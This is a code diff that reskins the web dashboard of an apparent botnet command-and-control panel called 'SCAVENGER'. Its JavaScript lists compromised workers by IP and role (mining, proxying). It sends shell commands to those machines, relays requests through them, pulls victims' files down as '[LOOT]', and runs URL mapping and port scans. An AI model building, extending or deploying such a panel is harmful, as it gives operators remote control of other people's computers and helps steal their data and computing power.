@@ -1,303 +1,248 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SCAVENGER // OS v4.0</title>
+    <title>SCAVENGER // CONTROL</title>
+    <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
     <style>
-        /* --- THEME CONFIG --- */
         :root {
-            --bg-color: #050505;
-            --term-green: #00ff41;
-            --term-dim: #003b0f;
-            --alert-red: #ff3333;
-            --scanline-color: rgba(0, 0, 0, 0.5);
-            --glass-reflection: rgba(255, 255, 255, 0.02);
-            --font-main: 'Courier New', monospace;
+            --bg-color: #1a1a1a;
+            --win-bg: #000000;
+            --border-light: #555;
+            --border-dark: #000;
+            --header-bg: #000080; /* Classic Blue Header */
+            --header-text: #fff;
+            --text-main: #e0e0e0;
+            --accent: #ffb000; /* Industrial Amber */
+            --alert: #ff3333;
         }
 
-        /* --- GLOBAL RESET --- */
-        body {
-            background-color: var(--bg-color);
-            margin: 0;
-            padding: 20px;
+        body { 
+            background-color: var(--bg-color); 
+            /* Subtle grid pattern background */
+            background-image: 
+                linear-gradient(var(--border-light) 1px, transparent 1px),
+                linear-gradient(90deg, var(--border-light) 1px, transparent 1px);
+            background-size: 20px 20px;
+            background-position: center center;
+            
+            font-family: 'VT323', monospace; /* The Unique Font */
+            font-size: 20px; /* VT323 needs to be big to look good */
+            margin: 0; padding: 15px; 
+            color: var(--text-main);
             height: 100vh;
             box-sizing: border-box;
-            font-family: var(--font-main);
-            color: var(--term-green);
-            overflow: hidden;
-            display: grid;
-            grid-template-rows: auto 1fr auto; /* Header, Main, Footer */
-            gap: 15px;
-            text-shadow: 0 0 5px var(--term-green); /* The Glow */
-        }
-
-        /* --- CRT EFFECT (THE SCREEN) --- */
-        body::before {
-            content: " ";
-            display: block;
-            position: absolute;
-            top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
-            z-index: 999;
-            background-size: 100% 2px, 3px 100%;
-            pointer-events: none; /* Let clicks pass through */
-        }
-
-        /* --- LAYOUT CONTAINERS --- */
-        .header-bar {
-            border-bottom: 2px solid var(--term-green);
-            display: flex;
-            justify-content: space-between;
-            padding-bottom: 5px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-        }
-
-        .main-deck {
-            display: grid;
-            grid-template-columns: 300px 1fr; /* Sidebar, Log */
-            gap: 15px;
-            height: 100%;
-            overflow: hidden;
-        }
-
-        .panel {
-            border: 1px solid var(--term-green);
-            background: rgba(0, 20, 0, 0.3);
             display: flex;
             flex-direction: column;
-            position: relative;
+            gap: 15px;
+            overflow: hidden;
         }
-        
-        .panel-header {
-            background: var(--term-green);
-            color: black;
-            padding: 2px 5px;
-            font-weight: bold;
-            font-size: 12px;
+
+        /* --- THE WINDOW SYSTEM --- */
+        .win-frame {
+            border: 2px solid var(--border-light);
+            background: var(--win-bg);
+            box-shadow: 4px 4px 0px #000; /* Hard shadow */
+            display: flex;
+            flex-direction: column;
+        }
+
+        .title-bar {
+            background: var(--header-bg);
+            color: var(--header-text);
+            padding: 2px 8px;
+            font-size: 22px;
             text-transform: uppercase;
+            letter-spacing: 1px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 2px solid var(--border-light);
         }
-
-        /* --- SIDEBAR WIDGETS --- */
-        .stat-row {
-            padding: 10px;
-            border-bottom: 1px solid var(--term-dim);
-        }
-        .stat-big {
-            font-size: 32px;
+        
+        .title-btn {
+            background: #c0c0c0;
+            color: black;
             font-weight: bold;
+            width: 20px;
+            height: 20px;
+            text-align: center;
+            line-height: 18px;
+            font-family: sans-serif;
+            font-size: 14px;
+            cursor: pointer;
+            box-shadow: inset 1px 1px #fff, inset -1px -1px #000;
         }
-        
-        /* --- AGENT GRID --- */
-        .agent-scroll {
-            overflow-y: auto;
-            flex-grow: 1;
-            font-size: 11px;
-        }
-        table { width: 100%; border-collapse: collapse; }
-        td, th { padding: 4px; text-align: left; }
-        th { border-bottom: 1px solid var(--term-green); color: var(--term-green); }
-        tr:hover { background: var(--term-dim); cursor: crosshair; }
-        
-        .status-mining { color: #fff; }
-        .status-proxy { color: #f0f; text-shadow: 0 0 5px #f0f; }
-        .status-idle { color: #555; text-shadow: none; }
 
-        /* --- LOG TERMINAL --- */
-        #log-window {
+        .win-content {
             padding: 10px;
-            overflow-y: scroll;
-            font-size: 13px;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
             flex-grow: 1;
-            background: #000;
         }
-        .log-entry { margin-bottom: 4px; border-left: 2px solid transparent; padding-left: 5px; }
-        .log-entry:hover { border-left: 2px solid var(--term-green); background: #051505; }
-        
-        /* Scrollbar Styling */
-        ::-webkit-scrollbar { width: 8px; }
-        ::-webkit-scrollbar-track { background: #000; }
-        ::-webkit-scrollbar-thumb { background: var(--term-green); border-radius: 0; }
 
-        /* --- COMMAND INPUT --- */
-        .input-bar {
+        /* --- LAYOUT GRID --- */
+        .top-deck {
+            display: grid;
+            grid-template-columns: 2fr 1fr; /* Logs take more space, Stats take less */
+            gap: 15px;
+            height: 60%; 
+        }
+
+        /* --- AGENT TABLE --- */
+        table { width: 100%; border-collapse: collapse; }
+        th { text-align: left; border-bottom: 1px dashed var(--border-light); color: var(--accent); font-weight: normal; }
+        td { padding: 2px 0; }
+        .row-mining { color: #fff; }
+        .row-proxy { color: #d400ff; } /* Hot Purple */
+        .row-idle { color: #555; }
+
+        /* --- METRICS --- */
+        .big-stat {
+            font-size: 48px;
+            color: var(--accent);
+            line-height: 1;
+        }
+        .stat-label { color: #888; text-transform: uppercase; }
+
+        /* --- LOGS --- */
+        #log-window {
+            overflow-y: scroll;
+            height: 100%;
+            padding-right: 5px;
+            background: #050505;
+        }
+        .log-entry { 
+            margin-bottom: 2px; 
+            border-bottom: 1px solid #111;
+        }
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 10px; background: #1a1a1a; }
+        ::-webkit-scrollbar-thumb { background: var(--border-light); border: 1px solid #000; }
+
+        /* --- CMD INPUT --- */
+        .cmd-frame {
+            background: #000;
+            border: 2px solid var(--border-light);
+            padding: 10px;
             display: flex;
             align-items: center;
-            border: 1px solid var(--term-green);
-            padding: 10px;
-            background: #000;
+            box-shadow: 4px 4px 0px #000;
         }
-        .prompt-char { margin-right: 10px; animation: blink 1s infinite; }
         input {
             background: transparent;
             border: none;
-            color: var(--term-green);
-            font-family: var(--font-main);
-            font-size: 16px;
+            color: var(--accent);
+            font-family: 'VT323', monospace;
+            font-size: 24px;
             width: 100%;
             outline: none;
-            text-shadow: 0 0 5px var(--term-green);
+            text-transform: uppercase;
         }
-
-        /* --- ANIMATIONS --- */
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
-
-        /* --- ASCII ART LOGO --- */
-        .ascii-logo {
-            white-space: pre;
-            font-size: 10px;
-            line-height: 8px;
-            margin-bottom: 10px;
-            color: var(--term-green);
-            opacity: 0.5;
-        }
-
-        /* --- SPECIAL HIGHLIGHTS --- */
-        .glitch-text { animation: blink 0.1s infinite; color: var(--alert-red); }
-        a { color: white; text-decoration: none; border-bottom: 1px dotted white; }
+        input::placeholder { color: #333; }
 
     </style>
 </head>
 <body>
 
-    <div class="header-bar">
-        <div>SCAVENGER_NET // v4.0.1 [STABLE]</div>
-        <div id="clock">00:00:00 UTC</div>
-    </div>
-
-    <div class="main-deck">
+    <div class="top-deck">
         
-        <div class="panel">
-            <div class="panel-header">:: SYSTEM TELEMETRY ::</div>
-            
-            <div class="stat-row">
-                <div style="font-size: 10px; color: #888;">COMPUTE POWER</div>
-                <div id="hashCount" class="stat-big">0.00M</div>
-                <div style="font-size: 10px;">H/s (AGGREGATED)</div>
+        <div class="win-frame">
+            <div class="title-bar">
+                <span>// SYSTEM_LOGS</span>
+                <div class="title-btn">X</div>
             </div>
-
-            <div class="stat-row">
-                <div style="font-size: 10px; color: #888;">CURRENT JOB STATUS</div>
-                <div style="background: #111; height: 10px; margin-top: 5px; border: 1px solid var(--term-green); position: relative;">
-                    <div id="taskBar" style="background: var(--term-green); width: 0%; height: 100%;"></div>
-                </div>
-                <div id="percText" style="font-size: 9px; text-align: right; margin-top:2px;">SEARCHING...</div>
-            </div>
-
-            <div class="panel-header" style="margin-top: auto;">:: ACTIVE NEURAL LINK ::</div>
-            <div class="agent-scroll">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>UNIT</th>
-                            <th>IP</th>
-                            <th>TASK</th>
-                        </tr>
-                    </thead>
-                    <tbody id="workerTable">
-                        </tbody>
-                </table>
+            <div class="win-content">
+                <div id="log-window"></div>
             </div>
         </div>
 
-        <div class="panel">
-            <div class="panel-header">:: EVENT STREAM (C:\LOGS\MAIN.LOG) ::</div>
-            <div id="log-window">
-                <div class="ascii-logo">
-   _____  ________ __      __  _______  _   __  ________  ______  _____   __
-  / ___/ / ____/ // | /| / /  / ___/ / | / / / ____/ / / / __ \/ ___/  / /
-  \__ \ / /   / // |/ |/ /  / __/ /  |/ / / / __/ / / / /_/ /\__ \  / / 
- ___/ // /___/ // /|  / /  / /___/ /|  / / /_/ / /_/ / _, _/___/ / /_/  
-/____/ \____/_//_/ |_/  /_____/_/ |_/  \____/\____/_/ |_|/____/ (_)   
+        <div class="win-frame">
+            <div class="title-bar">
+                <span>// SWARM_STATE</span>
+                <div class="title-btn">_</div>
+            </div>
+            <div class="win-content" style="gap: 20px;">
+                
+                <div>
+                    <div class="stat-label">AGGREGATE HASHRATE</div>
+                    <div id="hashCount" class="big-stat">0.00</div>
+                    <div style="font-size:16px;">MH/s</div>
                 </div>
-                <div class="log-entry">System Initialized... Waiting for uplink.</div>
+
+                <div>
+                    <div class="stat-label">CURRENT JOB</div>
+                    <div style="border: 2px solid var(--border-light); height: 20px; margin-top: 5px; background: #111;">
+                        <div id="taskBar" style="width: 0%; height: 100%; background: var(--accent);"></div>
+                    </div>
+                    <div id="percText" style="text-align: right; color: var(--accent);">IDLE</div>
+                </div>
+
+                <div style="flex-grow: 1; overflow-y: auto; border-top: 2px solid var(--border-light); padding-top: 5px;">
+                    <table>
+                        <thead>
+                            <tr><th>UNIT</th><th>IP</th><th>ACT</th></tr>
+                        </thead>
+                        <tbody id="workerTable"></tbody>
+                    </table>
+                </div>
+
             </div>
         </div>
-
     </div>
 
-    <div class="input-bar">
-        <span class="prompt-char">█</span>
-        <input type="text" id="cmdInput" placeholder="ENTER COMMAND..." autocomplete="off">
+    <div class="cmd-frame">
+        <span style="color: var(--accent); margin-right: 10px;">ROOT@SCAVENGER:~#</span>
+        <input type="text" id="cmdInput" placeholder="AWAITING INSTRUCTION..." autocomplete="off">
     </div>
 
     <script>
-        // --- CLOCK ---
-        setInterval(() => {
-            document.getElementById('clock').innerText = new Date().toISOString().split('T')[1].split('.')[0] + " UTC";
-        }, 1000);
-
-        // --- CORE LOGIC (UNCHANGED) ---
         const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
         const wsUrl = protocol + '//' + window.location.host;
-        let ws; 
-        const logDiv = document.getElementById('log-window');
+        let ws; const logDiv = document.getElementById('log-window');
 
         function connect() {
             let key = localStorage.getItem('access_key');
             if (!key) {
-                key = prompt("AUTHENTICATION REQUIRED // ENTER KEY:");
+                key = prompt("SECURE TERMINAL // ENTER KEY:");
                 if (key) localStorage.setItem('access_key', key);
             }
-            
-            log("Initializing winsock protocol...");
             ws = new WebSocket(wsUrl + '?key=' + key);
-
-            ws.onopen = () => { 
-                log("UPLINK ESTABLISHED. HANDSHAKE COMPLETE."); 
-                ws.send(JSON.stringify({ type: 'REGISTER_CLIENT' })); 
-            };
-            
-            ws.onclose = () => { 
-                log("CARRIER SIGNAL LOST. RETRYING IN 3s..."); 
-                setTimeout(connect, 3000); 
-            };
-            
+            ws.onopen = () => { log("UPLINK SECURED.", "#0f0"); ws.send(JSON.stringify({ type: 'REGISTER_CLIENT' })); };
+            ws.onclose = () => { log("SIGNAL LOST. RECONNECTING...", "#f00"); setTimeout(connect, 3000); };
             ws.onmessage = (event) => {
                 const data = JSON.parse(event.data);
                 if(data.type === 'STATS') updateDashboard(data);
-                if(data.type === 'PROXY_LOG') log(`[PROXY] ${data.data.status || 'ERR'} | ${data.data.url || '...'}`);
+                if(data.type === 'PROXY_LOG') log(`[PROXY] ${data.data.status} > ${data.data.url}`, "#d400ff");
                 if(data.type === 'SHELL_LOG') logHTML(data.output);
-                if(data.type === 'EXFIL_RECEIVE') { log(`[LOOT] ${data.filename}`); downloadFile(data.filename, data.data); }
-                if(data.type === 'SNIPE_LOG') { log(`[ALPHA] ${data.data.ticker} :: ${data.data.mentions}`); }
+                if(data.type === 'EXFIL_RECEIVE') { log(`[LOOT] SAVED: ${data.filename}`, "#0f0"); downloadFile(data.filename, data.data); }
+                if(data.type === 'SNIPE_LOG') { log(`[ALPHA] ${data.data.ticker} >> ${data.data.mentions}`, "#ffb000"); }
                 if(data.type === 'MAP_LOG') handleMapLog(data.data);
                 if(data.type === 'SCAN_LOG') handleScanLog(data.data);
             };
         }
 
         function updateDashboard(data) {
-            document.getElementById('hashCount').innerText = (data.totalHashes / 1000000).toFixed(2) + "M";
-            
-            const tbody = document.getElementById('workerTable'); 
-            tbody.innerHTML = '';
-            
+            document.getElementById('hashCount').innerText = (data.totalHashes / 1000000).toFixed(2);
+            const tbody = document.getElementById('workerTable'); tbody.innerHTML = '';
             data.workers.forEach(w => {
                 const row = document.createElement('tr');
-                let statusClass = 'status-mining';
-                if (w.role === 'PROXYING') statusClass = 'status-proxy';
-                if (w.role === 'IDLE') statusClass = 'status-idle';
-
-                row.innerHTML = `
-                    <td style="color:#888">${w.id}</td>
-                    <td>${w.ip}</td>
-                    <td class="${statusClass}">${w.role}</td>
-                `;
+                let cls = 'row-mining';
+                if (w.role === 'PROXYING') cls = 'row-proxy';
+                if (w.role === 'IDLE') cls = 'row-idle';
+                row.innerHTML = `<td style="color:#888">${w.id}</td><td>${w.ip}</td><td class="${cls}">${w.role}</td>`;
                 tbody.appendChild(row);
             });
-
             if (data.goldenTicket) {
                 document.getElementById('taskBar').style.width = "100%"; 
-                document.getElementById('taskBar').style.backgroundColor = "gold";
-                document.getElementById('percText').innerText = "TARGET ACQUIRED: " + data.goldenTicket;
-                document.getElementById('percText').style.color = "black";
-                document.getElementById('percText').style.fontWeight = "bold";
+                document.getElementById('taskBar').style.backgroundColor = "#0f0";
+                document.getElementById('percText').innerText = "CRACKED: " + data.goldenTicket;
             }
         }
 
-        // --- COMMAND HANDLER ---
         document.getElementById('cmdInput').addEventListener('keypress', function (e) {
             if (e.key === 'Enter') {
                 const cmd = this.value; this.value = '';
-                
                 if (cmd.startsWith('$ ')) ws.send(JSON.stringify({ type: 'SEND_SHELL_CMD', command: cmd.substring(2) }));
                 else if (cmd.startsWith('curl ')) ws.send(JSON.stringify({ type: 'SEND_PROXY_CMD', url: cmd.split(' ')[1] }));
                 else if (cmd.startsWith('download ')) ws.send(JSON.stringify({ type: 'SEND_EXFIL_CMD', path: cmd.split(' ')[1] }));
@@ -306,36 +251,24 @@
                 else if (cmd.startsWith('map ')) ws.send(JSON.stringify({ type: 'SEND_MAP_CMD', url: cmd.split(' ')[1] }));
                 else if (cmd.startsWith('scan ')) ws.send(JSON.stringify({ type: 'SEND_SCAN_CMD', ip: cmd.split(' ')[1] }));
                 else if (cmd.startsWith('archive ')) ws.send(JSON.stringify({ type: 'SEND_ARCHIVE_CMD', url: cmd.split(' ')[1] }));
-                else log("ERR: UNKNOWN COMMAND SYNTAX.");
             }
         });
 
-        // --- HELPER FUNCTIONS ---
         function downloadFile(filename, base64) {
             const link = document.createElement('a'); link.href = `data:application/octet-stream;base64,${base64}`;
             link.download = filename; document.body.appendChild(link); link.click(); document.body.removeChild(link);
         }
 
-        function log(msg) {
+        function log(msg, color = "#fff") {
             const line = document.createElement('div'); line.className = 'log-entry';
-            line.innerHTML = `<span style="color:#444">[${new Date().toLocaleTimeString()}]</span> ${msg}`;
+            const time = new Date().toLocaleTimeString('en-US', { hour12: false });
+            line.innerHTML = `<span style="color:#555">[${time}]</span> <span style="color:${color}">${msg}</span>`;
             logDiv.appendChild(line); logDiv.scrollTop = logDiv.scrollHeight;
         }
 
-        function logHTML(html) {
-            const line = document.createElement('div'); line.className = 'log-entry';
-            line.innerHTML = `<span style="color:#444">[SHELL]</span> <span style="color:#fff">${html.replace(/\n/g, "<br>")}</span>`;
-            logDiv.appendChild(line); logDiv.scrollTop = logDiv.scrollHeight;
-        }
-
-        function handleMapLog(res) {
-            const color = res.status === 200 ? '#00ff41' : '#ff9900';
-            logHTML(`<span style="color:${color}">[MAP] HTTP ${res.status}</span> :: /${res.path}`);
-        }
-
-        function handleScanLog(res) {
-            logHTML(`<span style="color:#ff3333; font-weight:bold;">[HYDRA] PORT ${res.port} OPEN</span> ON ${res.ip}`);
-        }
+        function logHTML(html) { log(html.replace(/\n/g, "<br>")); }
+        function handleMapLog(res) { log(`[MAP] ${res.status} > /${res.path}`, res.status === 200 ? "#0f0" : "#d400ff"); }
+        function handleScanLog(res) { log(`[HYDRA] PORT ${res.port} OPEN ON ${res.ip}`, "#f00"); }
 
         connect();
     </script>
